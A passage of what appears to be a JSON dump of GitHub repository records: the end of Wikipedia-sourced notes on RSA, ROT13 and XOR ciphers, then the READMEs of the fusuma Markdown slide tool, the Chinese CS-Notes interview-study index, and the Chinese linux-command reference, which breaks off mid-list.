value. The prime numbers must be kept secret. Anyone can use the public key to encrypt a message, but with currently published methods, and if the public key is large enough, only someone with knowledge of the prime numbers can decode the message feasibly.[2] Breaking RSA encryption is known as the RSA problem. Whether it is as difficult as the factoring problem remains an open question.\nSource: Wikipedia\nROT13\n\nROT13 (\"rotate by 13 places\", sometimes hyphenated ROT-13) is a simple letter substitution cipher that replaces a letter with the 13th letter after it, in the alphabet. ROT13 is a special case of the Caesar cipher which was developed in ancient Rome.\nBecause there are 26 letters (2\u00d713) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding. The algorithm provides virtually no cryptographic security, and is often cited as a canonical example of weak encryption.[1]\nSource: Wikipedia\nXOR\nXOR cipher is a simple type of additive cipher,[1] an encryption algorithm that operates according to the principles:\nA {\\displaystyle \\oplus } \\oplus  0 = A,\nA {\\displaystyle \\oplus } \\oplus  A = 0,\n(A {\\displaystyle \\oplus } \\oplus  B) {\\displaystyle \\oplus } \\oplus  C = A {\\displaystyle \\oplus } \\oplus  (B {\\displaystyle \\oplus } \\oplus  C),\n(B {\\displaystyle \\oplus } \\oplus  A) {\\displaystyle \\oplus } \\oplus  A = B {\\displaystyle \\oplus } \\oplus  0 = B,\nwhere {\\displaystyle \\oplus } \\oplus  denotes the exclusive disjunction (XOR) operation. This operation is sometimes called modulus 2 addition (or subtraction, which is identical).[2] With this logic, a string of text can be encrypted by applying the bitwise XOR operator to every character using a given key. To decrypt the output, merely reapplying the XOR function with the key will remove the cipher.\nSource: Wikipedia"}, {"title": "hiroppy/fusuma", "language": "CSS", "content": "\ud83d\udcdd Make slides with Markdown easily.\n\n\n\n\n\n\nJust write MarkDown and create cool slides.\ud83d\ude0e\nFeatures\n\nsupports WebSlides\nsupports Presentation API\n\nalso, it works even without Presentation API\n\n\nsupports various modes\n\ndevelopment\nproduction build\nexporting as PDF\ndeploying to GitHub Pages\n\n\nsupports SNS, OGP, FullScreen, and etc...\nsupports Presenter Mode\n\nyou can give a speech while watching a presenter's notes and a timer\n\n\ncustomizes JavaScript and CSS freely\n\nDemos\n\nintroduction slide of Fusuma [repository]\nothers [repository]\n\nYou can also try Fusuma in Gitpod, a one-click online IDE for GitHub:\n\nInstall\nNode versions > v8\n$ npm i fusuma --save-dev # or npm i fusuma -g\n\n# if you want to use yarn\n$ yarn add fusuma --dev\nProcedure\nJust execute the following three lines for executing, generating and deploying slides!\n$ npm i fusuma -D\n$ npx fusuma init\n$ mkdir slides && echo '# Hello\ud83d\ude04' > slides/title.md\n\n# --- Tree ---\n$ tree -a\n.\n\u251c\u2500\u2500 .fusumarc.yml\n\u2514\u2500\u2500 slides\n    \u2514\u2500\u2500 title.md\n\n1 directory, 2 files\n\n# --- executable tasks---\n$ npx fusuma start    # development\n$ npx fusuma build    # build as NODE_ENV=production\n$ npx fusuma deploy   # deploy to github pages\n$ npx fusuma pdf      # export as PDF from HTML\nWhen npx fusuma start is executed, fusuma will create a slide as follows and serves localhost:8080.\n\nAnd you can customize the slide using CSS.\nDirectory Structure\nPlease see samples/intro or Verification Repository.\nSlide order is numeric, alphabetical.\n.\n\u251c\u2500\u2500 .fusumarc.yml       <-- the configuration file\n\u251c\u2500\u2500 index.js            <-- optional for rewriting\n\u251c\u2500\u2500 slides              <-- slides written by Markdown or HTML\n\u2502   \u251c\u2500\u2500 0-title.md\n\u2502   \u251c\u2500\u2500 01-content.md\n\u2502   \u251c\u2500\u2500 02-body\n\u2502   \u2502   \u2514\u2500\u2500 0-title.md\n\u2502   \u2514\u2500\u2500 03-end.md\n\u2514\u2500\u2500 style.css           <-- optional for rewriting\n\n2 directories, 7 files\n\nOr slides can be divided by --- like below.\n## Hello\n\nThis is the first slide.\n\n---\n\n## \ud83e\udd2d\n\nThis is the second slide.\nUsage\nFusuma provides CLI.\n   fusuma.js 1.0.0 - CLI for easily make slides with Markdown\n\n   USAGE\n\n     fusuma.js <command> [options]\n\n   COMMANDS\n\n     init                Create a configure file\n     start               Start with webpack-dev-server\n     build               Build with webpack\n     deploy              Deploy to GitHub pages\n     pdf                 Export as PDF\n     help <command>      Display help for a specific command\n\n   GLOBAL OPTIONS\n\n     -h, --help         Display help\n     -V, --version      Display version\n     --no-color         Disable colors\n     --quiet            Quiet mode - only displays warn and error messages\n     -v, --verbose      Verbose mode - will also output debug messages\nConfiguration File\nSupports for yaml and js and it can be generated by running fusuma init.\n.fusumarc.yml\n\nmeta:\n  url: https://slides.hiroppy.me\n  name: the present and future of JavaScript\n  author: Yuta Hiroto\n  description: Explain how specifications are determined and how it will be in the future.\n  thumbnail: https://avatars1.githubusercontent.com/u/1725583?v=4&s=200\n  siteName: slides.hiroppy.me\n  repositoryUrl: https://github.com/hiroppy/fusuma\n  sns:\n    - twitter\n    - hatena\nslide:\n  loop: true\n  sidebar: true\n  targetBlank: true\n  showIndex: false\n  isVertical: false\n  code:\n    languages:\n      - javascript\n    plugins:\n      - line-numbers\n    theme: default\nextends:\n  js: index.js\n  css: style.css\n\n.fusumarc.js\n\nmodule.exports = {\n  meta: {\n    url: 'https://slide.hiroppy.me',\n    name: 'test-test',\n    author: 'hiroppy',\n    description: 'test',\n    thumbnail: 'url',\n    siteName: 'siteName',\n    sns: ['twitter', 'hatena'],\n    repositoryUrl: 'https://github.com/hiroppy/fusuma'\n  },\n  slide: {\n    loop: true,\n    sidebar: true,\n    targetBlank: true,\n    showIndex: false,\n    isVertical: false,\n    code: {\n      languages: ['javascript'],\n      plugins: ['line-numbers'],\n      theme: 'default'\n    }\n  },\n  extends: {\n    js: 'index.js',\n    css: 'style.css'\n  }\n};\n\nSlide Syntax\nSee the example slide:) Syntax Provided by Fusuma\nCode Syntax Highlighting\nFusuma uses Prism.js.\nYou can specify languages, plugins, theme to .fusumrc.\nPlease see babel-plugin-prismjs for detail.\nslide:\n  code:\n    languages: # the default is ['javascript']\n      - javascript\n    plugins: # the default is []\n      - line-numbers\n    theme: default # the default is \"default\"\nPlayground of Prism.js\nPresenter Mode\n\nopen Sidebar(click the bottom right button(\u4e09))\nclick the PC monitor icon\nif you use Chrome, you can choose select cast device\nif you use a browser that does not support Presentation API, a new window will be created\n\n\nAPI\nconst { start, build, deploy, pdf } = require('fusuma');"}, {"title": "CyC2018/CS-Notes", "language": "Java", "content": "\u79bb\u7ebf\u9605\u8bfb\u7248\u672c\u4e0b\u8f7d\n\n\n\n\n\n\u00a0\u7b97\u6cd5\u00a0\n\u64cd\u4f5c\u7cfb\u7edf\n\u00a0\u7f51\u7edc\u00a0\n\u9762\u5411\u5bf9\u8c61\n\u00a0\u00a0\u6570\u636e\u5e93\u00a0\u00a0\n\u00a0\u00a0\u00a0Java\u00a0\u00a0\u00a0\n\u7cfb\u7edf\u8bbe\u8ba1\n\u00a0\u00a0\u00a0\u5de5\u5177\u00a0\u00a0\u00a0\n\u7f16\u7801\u5b9e\u8df5\n\u00a0\u00a0\u00a0\u540e\u8bb0\u00a0\u00a0\u00a0\n\n\n\n\n\u270f\ufe0f\n\ud83d\udcbb\n\u2601\ufe0f\n\ud83c\udfa8\n\ud83d\udcbe\n\u2615\ufe0f\n\ud83d\udca1\n\ud83d\udd27\n\ud83c\udf49\n\ud83d\udcdd\n\n\n\n\n\n\n\n   \n \n\n\u270f\ufe0f \u7b97\u6cd5\n\n\u5251\u6307 Offer \u9898\u89e3\nLeetcode \u9898\u89e3\n\u7b97\u6cd5\n\n\ud83d\udcbb \u64cd\u4f5c\u7cfb\u7edf\n\n\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\nLinux\n\n\u2601\ufe0f \u7f51\u7edc\n\n\u8ba1\u7b97\u673a\u7f51\u7edc\nHTTP\nSocket\n\n\ud83c\udfa8 \u9762\u5411\u5bf9\u8c61\n\n\u8bbe\u8ba1\u6a21\u5f0f\n\u9762\u5411\u5bf9\u8c61\u601d\u60f3\n\n\ud83d\udcbe \u6570\u636e\u5e93\n\n\u6570\u636e\u5e93\u7cfb\u7edf\u539f\u7406\nSQL\nLeetcode-Database \u9898\u89e3\nMySQL\nRedis\n\n\u2615\ufe0f Java\n\nJava \u57fa\u7840\nJava \u5bb9\u5668\nJava \u5e76\u53d1\nJava \u865a\u62df\u673a\nJava I/O\n\n\ud83d\udca1 \u7cfb\u7edf\u8bbe\u8ba1\n\n\u7cfb\u7edf\u8bbe\u8ba1\u57fa\u7840\n\u5206\u5e03\u5f0f\n\u96c6\u7fa4\n\u653b\u51fb\u6280\u672f\n\u7f13\u5b58\n\u6d88\u606f\u961f\u5217\n\n\ud83d\udd27 \u5de5\u5177\n\nGit\nDocker\n\u6784\u5efa\u5de5\u5177\n\u6b63\u5219\u8868\u8fbe\u5f0f\n\n\ud83c\udf49 \u7f16\u7801\u5b9e\u8df5\n\n\u4ee3\u7801\u53ef\u8bfb\u6027\n\u4ee3\u7801\u98ce\u683c\u89c4\u8303\n\n\ud83d\udcdd \u540e\u8bb0\n\u516c\u4f17\u53f7\n\u66f4\u591a\u7cbe\u5f69\u5185\u5bb9\u5c06\u53d1\u5e03\u5728\u516c\u4f17\u53f7 CyC2018\uff0c\u516c\u4f17\u53f7\u63d0\u4f9b\u4e86\u8be5\u9879\u76ee\u7684\u79bb\u7ebf\u9605\u8bfb\u7248\u672c\uff0c\u540e\u53f0\u56de\u590d \"\u4e0b\u8f7d\" \u5373\u53ef\u9886\u53d6\u3002\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4efd\u6280\u672f\u9762\u8bd5\u590d\u4e60\u601d\u7ef4\u5bfc\u56fe\uff0c\u4e0d\u4ec5\u7cfb\u7edf\u6574\u7406\u4e86\u9762\u8bd5\u77e5\u8bc6\u70b9\uff0c\u800c\u4e14\u6807\u6ce8\u4e86\u5404\u4e2a\u77e5\u8bc6\u70b9\u7684\u91cd\u8981\u7a0b\u5ea6\uff0c\u4ece\u800c\u5e2e\u4f60\u7406\u6e05\u591a\u800c\u6742\u7684\u9762\u8bd5\u77e5\u8bc6\u70b9\uff0c\u540e\u53f0\u56de\u590d \"\u8d44\u6599\" \u5373\u53ef\u9886\u53d6\u3002\u6211\u57fa\u672c\u662f\u6309\u7167\u8fd9\u4e2a\u601d\u7ef4\u5bfc\u56fe\u6765\u8fdb\u884c\u590d\u4e60\u7684\uff0c\u5bf9\u6211\u62ff\u5230\u4e86 BAT \u5934\u6761\u7b49 Offer \u8d77\u5230\u5f88\u5927\u7684\u5e2e\u52a9\u3002\u4f60\u4eec\u5b8c\u5168\u53ef\u4ee5\u548c\u6211\u4e00\u6837\u6839\u636e\u601d\u7ef4\u5bfc\u56fe\u4e0a\u5217\u7684\u77e5\u8bc6\u70b9\u6765\u8fdb\u884c\u590d\u4e60\uff0c\u5c31\u4e0d\u7528\u770b\u5f88\u591a\u4e0d\u91cd\u8981\u7684\u5185\u5bb9\uff0c\u4e5f\u53ef\u4ee5\u77e5\u9053\u54ea\u4e9b\u5185\u5bb9\u5f88\u91cd\u8981\u4ece\u800c\u591a\u5b89\u6392\u4e00\u4e9b\u590d\u4e60\u65f6\u95f4\u3002\n\nQQ \u7fa4\n\u4e3a\u5927\u5bb6\u63d0\u4f9b\u4e00\u4e2a\u5b66\u4e60\u4ea4\u6d41\u5e73\u53f0\uff0c\u5728\u8fd9\u91cc\u4f60\u53ef\u4ee5\u81ea\u7531\u5730\u8ba8\u8bba\u6280\u672f\u95ee\u9898\u3002\n\n\u540e\u7aef\u9762\u8bd5\u8fdb\u9636\u6307\u5357\n\n\n\u5185\u63a8\u4fe1\u606f\nJob-Recommend\n\u7ed8\u56fe\u5de5\u5177\ndraw.io\nGithub Page\ndocsify\nLogo\nPower by logomakr.\n\u6392\u7248\n\u7b14\u8bb0\u5185\u5bb9\u6309\u7167 \u4e2d\u6587\u6587\u6848\u6392\u7248\u6307\u5317 \u8fdb\u884c\u6392\u7248\uff0c\u4ee5\u4fdd\u8bc1\u5185\u5bb9\u7684\u53ef\u8bfb\u6027\u3002\n\u4e0d\u4f7f\u7528 ![]() \u8fd9\u79cd\u65b9\u5f0f\u6765\u5f15\u7528\u56fe\u7247\uff0c\u800c\u662f\u7528 <img> \u6807\u7b7e\u3002\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u80fd\u591f\u63a7\u5236\u56fe\u7247\u4ee5\u5408\u9002\u7684\u5927\u5c0f\u663e\u793a\uff0c\u53e6\u4e00\u65b9\u9762\u662f\u56e0\u4e3a GFM \u4e0d\u652f\u6301 <center> ![]() </center> \u8fd9\u79cd\u65b9\u6cd5\u8ba9\u56fe\u7247\u5c45\u4e2d\u663e\u793a\uff0c\u53ea\u80fd\u4f7f\u7528 <div align=\"center\"> <img src=\"\"/> </div> \u8fbe\u5230\u5c45\u4e2d\u7684\u6548\u679c\u3002\n\u5728\u7ebf\u6392\u7248\u5de5\u5177\uff1aText-Typesetting\u3002\n\u4e0a\u4f20\u65b9\u6848\n\u4e3a\u4e86\u65b9\u4fbf\u5c06\u672c\u5730\u7b14\u8bb0\u5185\u5bb9\u4e0a\u4f20\u5230 Github \u4e0a\uff0c\u5b9e\u73b0\u4e86\u4e00\u6574\u5957\u81ea\u52a8\u5316\u4e0a\u4f20\u65b9\u6848\uff0c\u5305\u62ec\u63d0\u53d6\u56fe\u7247\u3001Markdown \u6587\u6863\u8f6c\u6362\u3001Git \u540c\u6b65\u3002\u8fdb\u884c Markdown \u6587\u6863\u8f6c\u6362\u662f\u56e0\u4e3a Github \u4f7f\u7528\u7684 GFM \u4e0d\u652f\u6301 MathJax \u516c\u5f0f\u548c TOC \u6807\u8bb0\uff0c\u6240\u4ee5\u9700\u8981\u66ff\u6362 MathJax \u516c\u5f0f\u4e3a CodeCogs \u7684\u4e91\u670d\u52a1\u548c\u91cd\u65b0\u751f\u6210 TOC \u76ee\u5f55\u3002\nGFM \u8f6c\u6362\u5de5\u5177\uff1aGFM-Converter\u3002\nLicense\n\u672c\u4ed3\u5e93\u5185\u5bb9 \u4e0d\u662f \u5c06\u7f51\u4e0a\u7684\u8d44\u6599\u968f\u610f\u62fc\u51d1\u800c\u6765\uff0c\u9664\u4e86\u5c11\u90e8\u5206\u5f15\u7528\u4e66\u4e0a\u548c\u6280\u672f\u6587\u6863\u7684\u539f\u6587\uff0c\u5176\u4f59\u90fd\u662f\u6211\u7684\u539f\u521b\u3002\u5728\u60a8\u5f15\u7528\u672c\u4ed3\u5e93\u5185\u5bb9\u6216\u8005\u5bf9\u5185\u5bb9\u8fdb\u884c\u4fee\u6539\u6f14\u7ece\u65f6\uff0c\u8bf7\u7f72\u540d\u5e76\u4ee5\u76f8\u540c\u65b9\u5f0f\u5171\u4eab\uff0c\u8c22\u8c22\u3002\n\u8f6c\u8f7d\u6587\u7ae0\u8bf7\u5728\u5f00\u5934\u660e\u663e\u5904\u6807\u660e\u8be5\u9875\u9762\u5730\u5740\u3002\u5982\u679c\u662f\u516c\u4f17\u53f7\u8f6c\u8f7d\uff0c\u4e5f\u8bf7\u5728\u5408\u9002\u7684\u4f4d\u7f6e\u8d34\u4e0a CyC2018 \u516c\u4f17\u53f7\u4e8c\u7ef4\u7801\u6d77\u62a5\u3002\n\n\u81f4\u8c22\n\u611f\u8c22\u4ee5\u4e0b\u4eba\u5458\u5bf9\u672c\u4ed3\u5e93\u505a\u51fa\u7684\u8d21\u732e\uff0c\u5f53\u7136\u4e0d\u4ec5\u4ec5\u53ea\u6709\u8fd9\u4e9b\u8d21\u732e\u8005\uff0c\u8fd9\u91cc\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u679c\u4f60\u5e0c\u671b\u88ab\u6dfb\u52a0\u5230\u8fd9\u4e2a\u540d\u5355\u4e2d\uff0c\u5e76\u4e14\u63d0\u4ea4\u8fc7 Issue \u6216\u8005 PR\uff0c\u8bf7\u4e0e\u6211\u8054\u7cfb\u3002\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b    \n\n\n\u200b"}, {"title": "jaywcjlove/linux-command", "language": "HTML", "content": "Linux Command\n \n550 \u591a\u4e2a Linux \u547d\u4ee4\uff0c\u5185\u5bb9\u5305\u542b Linux \u547d\u4ee4\u624b\u518c\u3001\u8be6\u89e3\u3001\u5b66\u4e60\uff0c\u503c\u5f97\u6536\u85cf\u7684 Linux \u547d\u4ee4\u901f\u67e5\u624b\u518c\u3002\u8bf7\u539f\u8c05\u6211\u5199\u4e86\u4e2a\u722c\u866b\uff0c\u722c\u4e86\u4ed6\u4eec\u5bb6\u7684\u6570\u636e linuxde.net \uff0c\u540c\u65f6\u8fdb\u884c\u4e86\u7f16\u8f91\uff0c\u589e\u52a0\u4e86\u4e00\u4e9b\u6570\u636e\u3002\u5bf9\u4ed6\u4eec\u7684\u8f9b\u52e4\u52b3\u52a8\u8868\u793a\u656c\u610f\uff0c\u4e2a\u4eba\u5e0c\u671b\u80fd\u672c\u5730\u79bb\u7ebf\u641c\u7d22\uff0c\u4e0d\u559c\u6b22\u5e7f\u544a\uff0c\u5e0c\u671b\u5f97\u5230\u5e72\u51c0\u6f02\u4eae\u7684\u9884\u89c8\u754c\u9762\uff0c\u4e1a\u4f59\u548c\u5de5\u4f5c\u65f6\u95f4\u9700\u8981\u4f7f\u7528\u5927\u91cf\u7684\u547d\u4ee4\uff0c\u6240\u4ee5\u5e72\u4e86\u4e00\u4ef6\u770b\u4f3c\u6bd4\u8f83\u611a\u8822\u7684\u4e8b\u60c5\uff0c\u5728\u56de\u5934\u6709\u7a7a\u7684\u65f6\u5019\u4f30\u8ba1\u80fd\u505a\u4e00\u4e2aApp\uff1f\uff0c\u6216\u8005\u662f\u547d\u4ee4\u884c\u5e2e\u52a9\u5de5\u5177\uff1f\u4f46\u76ee\u524d\u8fd8\u6ca1\u6709\u8ba1\u5212...\nWeb | Dash | Alfred | Krunner | Android | Mac/Win/Linux | Chrome Plugin\n\u5f00\u53d1\u4f7f\u7528\n\u53ef\u4ee5\u901a\u8fc7 npm \u5b89\u88c5 linux-command \u5305\uff0c\u5305\u542b\u6240\u6709\u547d\u4ee4\u7684 markdown \u6587\u672c\uff0c\u548c\u4e00\u4e2a\u7d22\u5f15\u6587\u4ef6\u3002\nnpm install linux-command\nvar comm = require(\"linux-command\");\nconsole.log(\"---->\", comm.ls);\n\nvar alias = require(\"linux-command/command/alias.md\");\nconsole.log(\"---->\", alias); // markdown string\n\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7 CDN \u6765\u8bbf\u95ee\u7d22\u5f15\u6570\u636e\uff0c\u548c\u5bf9\u5e94\u7684\u547d\u4ee4\u8be6\u7ec6\u5185\u5bb9\uff0c\u6211\u5c06\u66f4\u65b0\u5185\u5bb9\u5b9a\u671f\u53d1\u5e03\u7248\u672c\uff0c\u63d0\u4f9b\u5927\u5bb6\u4f7f\u7528\uff0cUNPKG \u5e26\u4e0a\u7248\u672c\u53f7\uff0c\u5c06\u9501\u5b9a\u7248\u672c\u8bbf\u95ee\uff0c\u5220\u9664\u7248\u672c\u53f7\u8bf7\u6c42\u6570\u636e\uff0c\u5c06\u4f1a\u81ea\u52a8\u91cd\u5b9a\u5411\u6700\u65b0\u7248\u672c\u3002\n# \u547d\u4ee4\u7d22\u5f15 JSON \u6570\u636e\nhttps://unpkg.com/linux-command/dist/data.json\n# \u5bf9\u5e94\u547d\u4ee4\u8be6\u60c5\uff08Markdown\uff09\u6570\u636e\nhttps://unpkg.com/linux-command/command/<\u547d\u4ee4\u540d\u79f0>.md\n\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7 Github \u7684 Raw \u6765\uff0c\u83b7\u53d6\u6700\u65b0\u7684\u5185\u5bb9\n# \u547d\u4ee4\u7d22\u5f15 JSON \u6570\u636e\nhttps://raw.githubusercontent.com/jaywcjlove/linux-command/master/dist/data.json\n# \u5bf9\u5e94\u547d\u4ee4\u8be6\u60c5\uff08Markdown\uff09\u6570\u636e\nhttps://raw.githubusercontent.com/jaywcjlove/linux-command/master/command/<\u547d\u4ee4\u540d\u79f0>.md \nChrome \u63d2\u4ef6\n\u53ef\u5728\u6e90\u7801\u4ed3\u5e93\u9884\u89c8\u6548\u679c\uff0cGithub\u4e0b\u8f7d crx \u6587\u4ef6\u5b89\u88c5 \u6216\u8005\u5f00\u6e90\u4e2d\u56fd\u4e0b\u8f7d crx \u6587\u4ef6\u5b89\u88c5 \u4e5f\u53ef\u901a\u8fc7 Chrome Web Store \u4e0b\u8f7d\uff1a\n\n\nWeb \u7248\u672c\nGithub Web | OSChina Web | Web 1\n\u626b\u63cf\u4e8c\u7ef4\u7801\u79fb\u52a8\u7aef\u9884\u89c8\u641c\u7d22\uff0c\u4e5f\u53ef\u901a\u8fc7\u4e8c\u7ef4\u7801\u4e0b\u9762\u94fe\u63a5\u5730\u5740\u6253\u5f00\u4f7f\u7528\u3002\n\n\u9884\u89c8\u641c\u7d22\uff1ahttps://git.io/linux\n\nAlfred \u7248\u672c\nAlfred \u7248\u672c\u4e0b\u8f7d\uff0c \u4e0b\u56fe\u662f\u754c\u9762\u6548\u679c\u3002\n\nDash \u7248\u672c\n\u7531 @SHANG\u6b87 \u63d0\u4f9b\u7684 Dash \u7248\u672c #91\uff0c\u53ef\u914d\u5408 alfred \u73a9\u800d\uff0c\u4e0b\u8f7d linux-command.docset.zip \u6587\u4ef6\u89e3\u538b\uff0c\u70b9\u51fb\u5b89\u88c5\u5373\u53ef\u3002\n\n\u76ee\u5f55\n\nLinux\u547d\u4ee4\u5206\u7c7b\n\n\u6587\u4ef6\u7ba1\u7406 File Management\n\u6587\u4ef6\u4f20\u8f93 File Transfer\n\u6587\u6863\u7f16\u8f91 File Editor\n\u5907\u4efd\u538b\u7f29 File Compression\n\u7cfb\u7edf\u7ba1\u7406 System Management\n\u7cfb\u7edf\u8bbe\u7f6e System Settings\n\u7f51\u7edc\u901a\u8baf Network Communication\n\u78c1\u76d8\u7ba1\u7406 Disk Management\n\u78c1\u76d8\u7ef4\u62a4 Disk Maintenance\n\u8bbe\u5907\u7ba1\u7406 Device Commands\n\u7535\u5b50\u90ae\u4ef6\u4e0e\u65b0\u95fb\u7ec4\n\u5176\u4ed6\u547d\u4ee4 Misc Commands\n\n\nNode\u8c03\u7528\nLinux\u5b66\u4e60\u8d44\u6e90\u6574\u7406\n\u793e\u533a\u7f51\u7ad9\n\u77e5\u8bc6\u76f8\u5173\n\u8f6f\u4ef6\u5de5\u5177\n\u4e2d\u56fd\u5f00\u6e90\u955c\u50cf\u7ad9\u70b9\n\u6e38\u620f\u73a9\u5bb6\u53d1\u884c\u7248\n\nLinux\u547d\u4ee4\u5206\u7c7b\n\u8fd9\u91cc\u5b58\u653eLinux \u547d\u4ee4\u5927\u5168\u5e76\u4e0d\u5168\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7linux-command\u6765\u641c\u7d22\uff0c\u5b83\u662f\u628a command \u76ee\u5f55\u91cc\u9762\u641c\u96c6\u7684\u547d\u4ee4\uff0c\u751f\u6210\u4e86\u9759\u6001HTML\u5e76\u63d0\u4f9b\u9884\u89c8\u4ee5\u53ca\u7d22\u5f15\u641c\u7d22\u3002\n\u6587\u4ef6\u4f20\u8f93\nbye\u3001ftp\u3001ftpcount\u3001ftpshut\u3001ftpwho\u3001ncftp\u3001tftp\u3001uucico\u3001uucp\u3001uupick\u3001uuto\u3001scp\n\u5907\u4efd\u538b\u7f29\nar\u3001bunzip2\u3001bzip2\u3001bzip2recover\u3001compress\u3001cpio\u3001dump\u3001gunzip\u3001gzexe\u3001gzip\u3001lha\u3001restore\u3001tar\u3001unarj\u3001unzip\u3001zip\u3001zipinfo\n\u6587\u4ef6\u7ba1\u7406\ndiff\u3001diffstat\u3001file\u3001find\u3001git\u3001gitview\u3001ln\u3001locate\u3001lsattr\u3001mattrib\u3001mc\u3001mcopy\u3001mdel\u3001mdir\u3001mktemp\u3001mmove\u3001mread\u3001mren\u3001mshowfat\u3001mtools\u3001mtoolstest\u3001mv\u3001od\u3001paste\u3001patch\u3001rcp\u3001rhmask\u3001rm\u3001slocate\u3001split\u3001tee\u3001tmpwatch\u3001touch\u3001umask\u3001whereis\u3001which\u3001cat\u3001chattr\u3001chgrp\u3001chmod\u3001chown\u3001cksum\u3001cmp\u3001cp\u3001cut\u3001indent\n\u78c1\u76d8\u7ba1\u7406\ncd\u3001df\u3001dirs\u3001du\u3001edquota\u3001eject\u3001lndir\u3001ls\u3001mcd\u3001mdeltree\u3001mdu\u3001mkdir\u3001mlabel\u3001mmd\u3001mmount\u3001mrd\u3001mzip\u3001pwd\u3001quota\u3001quotacheck\u3001quotaoff\u3001quotaon\u3001repquota\u3001rmdir\u3001rmt\u3001stat\u3001tree\u3001umount\n\u78c1\u76d8\u7ef4\u62a4\nbadblocks\u3001cfdisk\u3001dd\u3001e2fsck\u3001ext2ed\u3001fdisk\u3001fsck.ext2\u3001fsck\u3001fsck.minix\u3001fsconf\u3001hdparm\u3001losetup\u3001mbadblocks\u3001mformat\u3001mkbootdisk\u3001mkdosfs\u3001mke2fs\u3001mkfs.ext2\u3001mkfs\u3001mkfs.minix\u3001mkfs.msdos\u3001mkinitrd\u3001mkisofs\u3001mkswap\u3001mpartition\u3001sfdisk\u3001swapoff\u3001swapon\u3001symlinks\u3001sync\n\u7cfb\u7edf\u8bbe\u7f6e\nalias\u3001apmd\u3001aumix\u3001bind\u3001chkconfig\u3001chroot\u3001clock\u3001crontab\u3001declare\u3001depmod\u3001dircolors\u3001dmesg\u3001enable\u3001eval\u3001export\u3001fbset\u3001grpconv\u3001grpunconv\u3001hwclock\u3001insmod\u3001kbdconfig\u3001lilo\u3001liloconfig\u3001lsmod\u3001minfo\u3001mkkickstart\u3001modinfo\u3001modprobe\u3001mouseconfig\u3001ntsysv\u3001passwd\u3001pwconv\u3001pwunconv\u3001rdate\u3001resize\u3001rmmod\u3001rpm\u3001set\u3001setconsole\u3001setenv\u3001setup\u3001sndconfig\u3001SVGAText Mode\u3001timeconfig\u3001ulimit\u3001unalias\u3001unset\n\u7cfb\u7edf\u7ba1\u7406\nadduser\u3001chfn\u3001chsh\u3001date\u3001exit\u3001finger\u3001free\u3001fwhois\u3001gitps\u3001groupdel\u3001groupmod\u3001halt\u3001id\u3001kill\u3001last\u3001lastb\u3001login\u3001logname\u3001logout\u3001logrotate\u3001newgrp\u3001nice\u3001procinfo\u3001ps\u3001pstree\u3001reboot\u3001renice\u3001rlogin\u3001rsh\u3001rwho\u3001screen\u3001shutdown\u3001sliplogin\u3001su\u3001sudo\u3001suspend\u3001swatch\u3001tload\u3001top\u3001uname\u3001useradd\u3001userconf\u3001userdel\u3001usermod\u3001vlock\u3001w\u3001who\u3001whoami\u3001whois\n\u6587\u6863\u7f16\u8f91\ncol\u3001colrm\u3001comm\u3001csplit\u3001ed\u3001egrep\u3001ex\u3001fgrep\u3001fmt\u3001fold\u3001grep\u3001ispell\u3001jed\u3001joe\u3001join\u3001look\u3001mtype\u3001pico\u3001rgrep\u3001sed\u3001sort\u3001spell\u3001tr\u3001uniq\u3001vi\u3001wc\n\u7f51\u7edc\u901a\u8baf\ndip\u3001getty\u3001mingetty\u3001ppp-off\u3001smbd(samba daemon)\u3001telnet\u3001uulog\u3001uustat\u3001uux\u3001cu\u3001dnsconf\u3001efax\u3001httpd\u3001ifconfig\u3001mesg\u3001minicom\u3001nc\u3001netconf\u3001netconfig\u3001netstat\u3001ping\u3001pppstats\u3001samba\u3001setserial\u3001shapecfg(shaper configuration)\u3001smbd(samba daemon)\u3001statserial(status ofserial port)\u3001talk\u3001tcpdump\u3001testparm(test parameter)\u3001traceroute\u3001tty(teletypewriter)\u3001uuname\u3001wall(write all)\u3001write\u3001ytalk\u3001arpwatch\u3001apachectl\u3001smbclient(samba client)\u3001pppsetup\n\u8bbe\u5907\u7ba1\u7406\ndumpkeys\u3001loadkeys\u3001MAKEDEV\u3001rdev\u3001setleds\n\u7535\u5b50\u90ae\u4ef6\u4e0e\u65b0\u95fb\u7ec4\narchive\u3001ctlinnd\u3001elm\u3001getlist\u3001inncheck\u3001mail\u3001mailconf\u3001mailq\u3001messages\u3001metamail\u3001mutt\u3001nntpget\u3001pine\u3001slrn\u3001X WINDOWS SYSTEM\u3001reconfig\u3001startx(start X Window)\u3001Xconfigurator\u3001XF86Setup\u3001xlsatoms\u3001xlsclients\u3001xlsfonts\n\u5176\u4ed6\u547d\u4ee4\nyes\nLinux\u5b66\u4e60\u8d44\u6e90\u6574\u7406\n\u793e\u533a\u7f51\u7ad9\n\nLinux\u4e2d\u56fd - \u5404\u79cd\u8d44\u8baf\u3001\u6587\u7ae0\u3001\u6280\u672f\n\u5b9e\u9a8c\u697c - \u514d\u8d39\u63d0\u4f9b\u4e86Linux\u5728\u7ebf\u73af\u5883\uff0c\u4e0d\u7528\u5728\u81ea\u5df1\u673a\u5b50\u4e0a\u88c5\u7cfb\u7edf\u4e5f\u53ef\u4ee5\u5b66\u4e60Linux\uff0c\u8d85\u65b9\u4fbf\u5b9e\u7528\u3002\n\u9e1f\u54e5\u7684linux\u79c1\u623f\u83dc - \u975e\u5e38\u9002\u5408Linux\u5165\u95e8\u521d\u5b66\u8005\u770b\u7684\u6559\u7a0b\u3002\nLinux\u516c\u793e - Linux\u76f8\u5173\u7684\u65b0\u95fb\u3001\u6559\u7a0b\u3001\u4e3b\u9898\u3001\u58c1\u7eb8\u90fd\u6709\u3002\nLinux Today - 